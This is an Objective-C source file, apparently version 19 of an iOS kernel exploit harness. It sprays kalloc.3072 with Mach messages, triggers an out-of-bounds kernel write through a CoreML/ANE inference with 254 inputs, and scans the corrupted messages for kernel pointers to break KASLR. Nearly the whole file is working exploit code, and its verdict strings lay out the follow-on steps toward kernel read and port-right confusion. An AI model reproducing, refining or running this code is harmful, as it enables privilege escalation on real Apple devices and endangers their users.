// P044AksKaslrReach.m
// v19: kind-aware victims + drain harvest + 120s window + FIXED KPTR scan.
// Cross-ref corrections from v18 source + P034 v3:
//   - v18 KPTR scan was dead code ((val>>36)==0xfffffff0 is unreachable);
//     correct test is (val>>32)==0xfffffff0.
//   - v18 leaked the 2048 drain ports and never scanned their kmsgs. Fixed.
//   - P034: kdata = msgh_size + 0x24; band [0x801,0xc00] -> kalloc.3072.
//     Inline (0xb98->0xbbc) and port-kind (0xb74->0xb98) share the zone.
//   - P034 discipline: n=2 control pass BEFORE fire = noise floor.
// Requires XVRC27_254in_1out_addchain.mlmodelc in bundle.

#import "P044AksKaslrReach.h"
#import "A14_23F77_LabOffsets.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <string.h>
#import <unistd.h>
#import <stdlib.h>

#define P044_BUILD @"p044-coreml-v19"
#define IOSURFACE_FW_PATH @"/System/Library/Frameworks/IOSurface.framework/IOSurface"

#define INPUT_COUNT 254
#define OUTPUT_COUNT 1
#define PAYLOAD_SIZE 0xb80
#define DRAIN_COUNT 2048
#define PAIR_COUNT 2048
#define COREML_MODEL_NAME @"XVRC27_254in_1out_addchain"

#define PORT_VICTIM_EVERY 16      /* victim index % 16 == 7 -> port-descriptor kind */
#define WINDOW_ROUNDS 8           /* 8 x 15s = 120s (delayed-landing lesson) */
#define WINDOW_ROUND_SEC 15

typedef struct {
    mach_port_t hole;
    mach_port_t victim;
    int kind;                 /* 0 = inline body, 1 = port descriptors */
    int done;                 /* already received this window */
} pair_t;

typedef struct {
    mach_msg_header_t hdr;
    uint8_t bytes[];
} inline_msg_t;

/* complex msg: hdr 0x18 + body 0x4 + 2 port descs 0x18 + pad -> 0xb74
   kdata = 0xb74 + 0x24 = 0xb98  (P034 band, kalloc.3072) */
typedef struct {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t desc[2];
    uint8_t pad[PAYLOAD_SIZE - 0x40];
} port_msg_t;

static void p044_write_log(NSString *out) {
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p044_aks_kaslr_reach_log.txt"];
    int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        const char *s = out.UTF8String;
        if (s) write(fd, s, strlen(s));
        fcntl(fd, F_FULLFSYNC);
        close(fd);
    }
}

static void fill_payload(uint8_t *p, uint32_t index, uint32_t role) {
    for (size_t i = 0; i < PAYLOAD_SIZE; i++) {
        p[i] = (uint8_t)(0xa5u ^ (uint8_t)(index * 17u) ^
                         (uint8_t)(role * 0x31u) ^ (uint8_t)(i * 13u));
    }
    uint64_t magic = role ? 0x5649435458563237ULL : 0x484f4c4558563237ULL;
    uint64_t marker = 0x4141414141414141ULL;
    uint64_t len = PAYLOAD_SIZE;
    memcpy(p + 0x00, &magic, sizeof(magic));
    memcpy(p + 0x08, &index, sizeof(index));
    memcpy(p + 0x0c, &role, sizeof(role));
    memcpy(p + 0x10, &len, sizeof(len));
    memcpy(p + 0x18, &marker, sizeof(marker));
}

static mach_port_t make_port(void) {
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) return MACH_PORT_NULL;
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    return port;
}

static void send_msg(mach_port_t port, uint32_t index, uint32_t role) {
    size_t msg_size = sizeof(inline_msg_t) + PAYLOAD_SIZE;
    inline_msg_t *msg = calloc(1, msg_size);
    if (!msg) return;

    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)msg_size;
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_id = (mach_msg_id_t)(0x58560000u | ((role & 0xffu) << 8) | (index & 0xffu));
    fill_payload(msg->bytes, index, role);

    mach_msg(&msg->hdr, MACH_SEND_MSG, (mach_msg_size_t)msg_size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
    free(msg);
}

/* Port-kind victim: two COPY_SEND descriptors (our own receive ports) queued
   on the victim port. Queued kmsg holds KERNEL port pointers in the desc area.
   Fill overwriting them = kernel consuming our bytes on later recv/send. */
static void send_port_msg(mach_port_t port, mach_port_t rightA, mach_port_t rightB,
                          uint32_t index) {
    size_t msg_size = sizeof(port_msg_t);
    port_msg_t *msg = calloc(1, msg_size);
    if (!msg) return;

    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) |
                         MACH_MSGH_BITS_COMPLEX;
    msg->hdr.msgh_size = (mach_msg_size_t)msg_size;
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_id = (mach_msg_id_t)(0x58570000u | (index & 0xffu));
    msg->body.msgh_descriptor_count = 2;
    msg->desc[0].name = rightA;
    msg->desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc[0].type = MACH_MSG_PORT_DESCRIPTOR;
    msg->desc[1].name = rightB;
    msg->desc[1].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc[1].type = MACH_MSG_PORT_DESCRIPTOR;

    mach_msg(&msg->hdr, MACH_SEND_MSG, (mach_msg_size_t)msg_size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
    free(msg);
}

static kern_return_t recv_msg(mach_port_t port, uint8_t *payload) {
    size_t msg_size = sizeof(inline_msg_t) + PAYLOAD_SIZE + sizeof(mach_msg_max_trailer_t) + 0x100;
    inline_msg_t *msg = calloc(1, msg_size);
    if (!msg) return MACH_MSG_SIZE_MAX;

    kern_return_t kr = mach_msg(&msg->hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                (mach_msg_size_t)msg_size, port, 1000, MACH_PORT_NULL);
    if (kr == MACH_MSG_SUCCESS && payload) {
        if (msg->hdr.msgh_size < sizeof(mach_msg_header_t) + PAYLOAD_SIZE) {
            kr = MACH_RCV_TOO_LARGE;
        } else {
            memcpy(payload, msg->bytes, PAYLOAD_SIZE);
        }
    }
    free(msg);
    return kr;
}

static void hexdump16(uint8_t *buf, size_t start, NSMutableString *out) {
    size_t base = start & ~(size_t)0xf;
    for (size_t off = base; off < base + 0x40 && off < PAYLOAD_SIZE; off += 0x10) {
        [out appendFormat:@"    %04zx:", off];
        for (size_t k = 0; k < 0x10 && off + k < PAYLOAD_SIZE; k++) {
            [out appendFormat:@" %02x", buf[off + k]];
        }
        [out appendString:@"\n"];
    }
}

/* FIXED KPTR scan: kernel VA iff (val >> 32) == 0xfffffff0.
   v18 tested (val >> 36) which is unreachable for 64-bit kernel VAs. */
static void kptr_scan(uint8_t *buf, uint32_t victim, NSMutableString *out) {
    for (size_t j = 0; j + 8 <= PAYLOAD_SIZE; j += 4) {
        uint64_t val = *(uint64_t *)&buf[j];
        if ((uint32_t)(val >> 32) == 0xfffffff0u) {
            [out appendFormat:@"    *** KPTR victim=%u body[0x%zx] = 0x%016llx ***\n",
                victim, j, (unsigned long long)val];
        }
    }
}

@implementation P044AksKaslrReach

+ (NSURL *)findCoreMLModelURL:(NSMutableString *)out {
    [out appendString:@"\n=== PHASE 1: Find CoreML model ===\n"];

    NSBundle *bundle = [NSBundle mainBundle];

    NSURL *compiledURL = [bundle URLForResource:COREML_MODEL_NAME withExtension:@"mlmodelc"];
    if (compiledURL) {
        [out appendFormat:@"  Found compiled model: %@\n", compiledURL.path];
        return compiledURL;
    }

    NSURL *sourceURL = [bundle URLForResource:COREML_MODEL_NAME withExtension:@"mlmodel"];
    if (!sourceURL) {
        NSString *sourcePath = [bundle.resourcePath stringByAppendingPathComponent:
                               [COREML_MODEL_NAME stringByAppendingPathExtension:@"mlmodel"]];
        if ([[NSFileManager defaultManager] fileExistsAtPath:sourcePath]) {
            sourceURL = [NSURL fileURLWithPath:sourcePath];
        }
    }

    if (!sourceURL) {
        NSArray *contents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle.bundlePath error:nil];
        [out appendString:@"  STOP: No .mlmodelc or .mlmodel found in bundle!\n"];
        [out appendFormat:@"  Bundle path: %@\n", bundle.bundlePath];
        [out appendFormat:@"  Bundle contents: %@\n", contents];
        return nil;
    }

    [out appendFormat:@"  Found source model: %@\n", sourceURL.path];
    [out appendString:@"  Compiling model at runtime (may take a few seconds)...\n"];

    NSError *compileErr = nil;
    NSURL *runtimeCompiledURL = [MLModel compileModelAtURL:sourceURL error:&compileErr];
    if (!runtimeCompiledURL) {
        [out appendFormat:@"  STOP: CoreML compile failed: %@\n", compileErr.localizedDescription];
        return nil;
    }

    [out appendFormat:@"  Runtime compiled to: %@\n", runtimeCompiledURL.path];
    return runtimeCompiledURL;
}

+ (MLModel *)loadCoreMLModel:(NSURL *)modelURL out:(NSMutableString *)out {
    [out appendString:@"\n=== PHASE 2: Load CoreML model ===\n"];

    MLModelConfiguration *configuration = [[MLModelConfiguration alloc] init];
    configuration.computeUnits = MLComputeUnitsAll;

    NSError *err = nil;
    MLModel *model = [MLModel modelWithContentsOfURL:modelURL
                                       configuration:configuration
                                               error:&err];
    if (!model) {
        [out appendFormat:@"  STOP: MLModel load failed: %@\n", err.localizedDescription];
        return nil;
    }

    [out appendString:@"  MLModel loaded successfully\n"];
    return model;
}

+ (MLDictionaryFeatureProvider *)createFeatures:(NSMutableString *)out {
    [out appendFormat:@"\n=== PHASE 3: Create %u input features ===\n", INPUT_COUNT];

    NSMutableDictionary<NSString *, MLFeatureValue *> *features =
        [NSMutableDictionary dictionaryWithCapacity:INPUT_COUNT];
    double expected = 0.0;

    for (uint32_t i = 0; i < INPUT_COUNT; i++) {
        double value = (double)(i + 1);
        NSString *name = [NSString stringWithFormat:@"x_%03u", i];

        NSError *err = nil;
        MLMultiArray *array = [[MLMultiArray alloc] initWithShape:@[@1]
                                                        dataType:MLMultiArrayDataTypeDouble
                                                           error:&err];
        if (!array) {
            [out appendFormat:@"  STOP: MLMultiArray create failed for %@: %@\n",
                name, err.localizedDescription];
            return nil;
        }
        array[0] = @(value);
        features[name] = [MLFeatureValue featureValueWithMultiArray:array];
        expected += value;
    }

    [out appendFormat:@"  Created %u features, expected sum=%.0f\n", INPUT_COUNT, expected];

    NSError *err = nil;
    MLDictionaryFeatureProvider *provider =
        [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:&err];
    if (!provider) {
        [out appendFormat:@"  STOP: FeatureProvider failed: %@\n", err.localizedDescription];
        return nil;
    }

    [out appendString:@"  FeatureProvider created\n"];
    return provider;
}

/* v19 spray: same geometry as v18, plus kind-mixed victims. Returns pairs;
   drain ports are returned via outDrain (v18 leaked them). */
+ (pair_t *)sprayOut:(NSMutableString *)out mach_port_t **outDrain {
    [out appendFormat:@"\n=== PHASE 4: Spray pairs=%u payload=0x%x (every %u victim = port-kind) ===\n",
        PAIR_COUNT, PAYLOAD_SIZE, PORT_VICTIM_EVERY];

    mach_port_t *drain = calloc(DRAIN_COUNT, sizeof(*drain));
    pair_t *pairs = calloc(PAIR_COUNT, sizeof(*pairs));
    if (!drain || !pairs) {
        free(drain);
        free(pairs);
        return NULL;
    }

    int drainOK = 0;
    for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
        drain[i] = make_port();
        if (drain[i]) {
            send_msg(drain[i], i, 2);
            drainOK++;
        }
    }
    [out appendFormat:@"  drain: %u/%u kmsgs queued (SCANNED in v19)\n", drainOK, DRAIN_COUNT];

    int pairOK = 0, portKind = 0;
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        pairs[i].hole = make_port();
        pairs[i].victim = make_port();
        pairs[i].kind = (i % PORT_VICTIM_EVERY == 7) ? 1 : 0;
        pairs[i].done = 0;
        if (pairs[i].hole && pairs[i].victim) {
            send_msg(pairs[i].hole, i, 0);
            if (pairs[i].kind == 1) {
                mach_port_t rightA = make_port();
                mach_port_t rightB = make_port();
                if (rightA && rightB) {
                    send_port_msg(pairs[i].victim, rightA, rightB, i);
                    portKind++;
                }
                if (rightA) mach_port_destroy(mach_task_self(), rightA);
                if (rightB) mach_port_destroy(mach_task_self(), rightB);
            } else {
                send_msg(pairs[i].victim, i, 1);
            }
            pairOK++;
        }
    }
    [out appendFormat:@"  spray: %u/%u pairs (inline=%u portkind=%u)\n",
        pairOK, PAIR_COUNT, pairOK - portKind, portKind];

    [out appendString:@"  Freeing holes to create empty kalloc.3072 slots...\n"];
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        if (pairs[i].hole) recv_msg(pairs[i].hole, NULL);
    }
    sync();

    [out appendString:@"  Spray complete. Holes freed.\n"];
    *outDrain = drain;
    return pairs;
}

/* P034 discipline: n=2 control pass while spray is held = noise floor. */
+ (int)baselineControl:(NSMutableString *)out model:(MLModel *)model {
    [out appendString:@"\n=== PHASE 4b: n=2 control pass (noise floor) ===\n"];

    NSURL *url = [[NSBundle mainBundle] URLForResource:@"simple_1in1out"
                                          withExtension:@"mlmodelc"];
    if (!url) {
        [out appendString:@"  no simple_1in1out.mlmodelc — control skipped (flag in verdict)\n"];
        return -1;
    }

    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = MLComputeUnitsAll;
    NSError *err = nil;
    MLModel *small = [MLModel modelWithContentsOfURL:url configuration:cfg error:&err];
    if (!small) {
        [out appendFormat:@"  control model load failed: %@\n", err.localizedDescription];
        return -1;
    }

    NSError *arrErr = nil;
    MLMultiArray *arr = [[MLMultiArray alloc] initWithShape:@[@1]
                                                  dataType:MLMultiArrayDataTypeDouble
                                                     error:&arrErr];
    if (!arr) return -1;
    arr[0] = @(3.0);
    NSError *fpErr = nil;
    MLDictionaryFeatureProvider *fp = [[MLDictionaryFeatureProvider alloc]
        initWithDictionary:@{ @"input": [MLFeatureValue featureValueWithMultiArray:arr] }
                     error:&fpErr];
    if (!fp) return -1;

    [small predictionFromFeatures:fp error:&err];
    [out appendFormat:@"  n=2 predict done (%@) — mutations this pass are interference, not 43748\n",
        err ? @"err" : @"ok"];
    return 0;
}

/* One scan pass over victims + drain. Returns victim hits. */
+ (int)scanOnce:(pair_t *)pairs drain:(mach_port_t *)drain
       drainHits:(int *)drainHitsOut out:(NSMutableString *)out {
    uint8_t expected[PAYLOAD_SIZE];
    uint8_t actual[PAYLOAD_SIZE];
    int hits = 0;

    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        if (!pairs[i].victim || pairs[i].done) continue;

        kern_return_t kr = recv_msg(pairs[i].victim, actual);
        if (kr != MACH_MSG_SUCCESS) continue;
        pairs[i].done = 1;

        if (pairs[i].kind == 0) {
            fill_payload(expected, i, 1);
            size_t first = SIZE_MAX;
            size_t changed = 0;
            for (size_t j = 0; j < PAYLOAD_SIZE; j++) {
                if (actual[j] != expected[j]) {
                    if (first == SIZE_MAX) first = j;
                    changed++;
                }
            }
            if (first != SIZE_MAX) {
                hits++;
                [out appendFormat:@"  HIT inline victim=%u first_diff=0x%zx changed=%zu\n",
                    i, first, changed];
                hexdump16(actual, first, out);
                kptr_scan(actual, (uint32_t)i, out);
            }
        } else {
            /* port-kind: recv SUCCESS means kernel processed a possibly-corrupted
               complex message. Compare against the pristine pad pattern. */
            hits++;
            [out appendFormat:@"  HIT port-kind victim=%u (recv OK — desc area follows)\n", i];
            hexdump16(actual, 0, out);
            kptr_scan(actual, (uint32_t)i, out);
        }
    }

    /* drain harvest (v18 never did this) */
    int dh = 0;
    for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
        if (!drain[i]) continue;
        kern_return_t kr = recv_msg(drain[i], actual);
        if (kr != MACH_MSG_SUCCESS) continue;

        /* structural corruption check: rebuild expected role-2 pattern */
        uint8_t expect[PAYLOAD_SIZE];
        for (size_t j = 0; j < PAYLOAD_SIZE; j++) {
            expect[j] = (uint8_t)(0xa5u ^ (uint8_t)(i * 17u) ^
                                  (uint8_t)(2u * 0x31u) ^ (uint8_t)(j * 13u));
        }
        uint64_t emagic = 0x5649435458563237ULL;
        uint32_t idx = 0;
        memcpy(&idx, actual + 0x08, 4);
        if (memcmp(actual, &emagic, 8) == 0 && idx == i) continue;   /* intact */

        dh++;
        [out appendFormat:@"  DRAIN-HIT drain=%u first changed bytes:\n", i];
        hexdump16(actual, 0, out);
        kptr_scan(actual, (uint32_t)i, out);
        if (dh >= 8) {
            [out appendString:@"  (drain scan truncated at 8 hits)\n"];
            break;
        }
    }
    if (drainHitsOut) *drainHitsOut = dh;
    return hits;
}

+ (NSString *)tap {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"=== p044 session %@ BUILD %@ ===\n",
        LabLocalMilitaryNow(), P044_BUILD];
    [out appendString:@"CoreML API approach + mach_msg spray.\n"];
    [out appendString:@"v18 confirmed OOB write (victim=2046, changed=993 = 0x3e0 window).\n"];
    [out appendString:@"v19: port-kind victims + drain harvest + 120s window + KPTR fix.\n\n"];

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p044"];
    if (stop) { [out appendString:stop]; p044_write_log(out); return out; }
    [out appendString:[LabDeviceProfile identBlock]];

    NSURL *modelURL = [self findCoreMLModelURL:out];
    if (!modelURL) { p044_write_log(out); return out; }

    MLModel *model = [self loadCoreMLModel:modelURL out:out];
    if (!model) { p044_write_log(out); return out; }

    MLDictionaryFeatureProvider *provider = [self createFeatures:out];
    if (!provider) { p044_write_log(out); return out; }

    mach_port_t *drain = NULL;
    pair_t *pairs = [self sprayOut:out drain:&drain];
    if (!pairs || !drain) {
        [out appendString:@"  STOP: Spray failed\n"];
        p044_write_log(out);
        return out;
    }

    [self baselineControl:out model:model];

    /* FIRE */
    [out appendString:@"\n=== PHASE 5: FIRE — CoreML inference (254 inputs) ===\n"];
    [out appendString:@">>> FIRING predictionFromFeatures with 254 inputs <<<\n"];
    [out appendString:@">>> ANE CheckandPrewire OOB write into kalloc.3072 <<<\n"];
    [out appendString:@">>> PANIC POSSIBLE — ips will have KASLR <<<\n\n"];
    p044_write_log(out);

    NSError *err = nil;
    id<MLFeatureProvider> prediction = [model predictionFromFeatures:provider error:&err];
    if (prediction) {
        [out appendString:@"  inference ok\n"];
    } else {
        [out appendFormat:@"  prediction FAILED: %@\n",
            err ? err.localizedDescription : @"<nil>"];
    }

    /* EXTENDED WINDOW: 8 x 15s (writes have surfaced at +27s and +52s) */
    [out appendFormat:@"\n=== PHASE 6: observation window %d x %ds ===\n",
        WINDOW_ROUNDS, WINDOW_ROUND_SEC];
    p044_write_log(out);

    int totalHits = 0;
    int drainHits = 0;
    for (int round = 0; round < WINDOW_ROUNDS; round++) {
        int roundDrain = 0;
        int h = [self scanOnce:pairs drain:drain drainHits:&roundDrain out:out];
        totalHits += h;
        drainHits += roundDrain;
        p044_write_log(out);
        if (totalHits > 0 && round >= 1) break;
        if (round < WINDOW_ROUNDS - 1) {
            [NSThread sleepForTimeInterval:(NSTimeInterval)WINDOW_ROUND_SEC];
        }
    }
    [out appendFormat:@"\n  totals: victim hits=%d drain hits=%d\n", totalHits, drainHits];

    /* VERDICT */
    [out appendString:@"\n=== VERDICT ===\n"];
    if (totalHits > 0 || drainHits > 0) {
        [out appendString:@"\n*** OOB WRITE CONFIRMED (v19, kind-aware) ***\n"];
        [out appendString:@"Fingerprint: [u32 surfaceId][u32 0xcN counter][1][1], 16B stride.\n"];
        [out appendString:@"KPTR lines above = LEAK (slide = val - unslid pin). hasKread path.\n"];
        [out appendString:@"port-kind recv OK = kernel consumed corrupted descriptors.\n"];
        [out appendString:@"Next: KPTR hit -> slide arithmetic + commitSlide path.\n"];
        [out appendString:@"      port-kind only -> right-confusion harness (v20).\n"];
      } else {
        [out appendString:@"\nNo corruption in 120s window. Occupancy miss at this density.\n"];
    }

    /* CLEANUP — includes the drain ports v18 leaked */
    [out appendString:@"\n=== CLEANUP ===\n"];
    for (uint32_t i = 0; i < DRAIN_COUNT; i++) {
        if (drain[i]) mach_port_destroy(mach_task_self(), drain[i]);
    }
    for (uint32_t i = 0; i < PAIR_COUNT; i++) {
        if (pairs[i].victim) {
            uint8_t drainBuf[0xd00];
            while (mach_msg(drainBuf, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                            sizeof(drainBuf), 0, pairs[i].victim, 1,
                            MACH_PORT_NULL) == KERN_SUCCESS) {}
            mach_port_destroy(mach_task_self(), pairs[i].victim);
        }
        if (pairs[i].hole) mach_port_destroy(mach_task_self(), pairs[i].hole);
    }
    free(pairs);
    free(drain);
    [out appendString:@"  cleanup done\n"];

    p044_write_log(out);
    return out;
}

@end
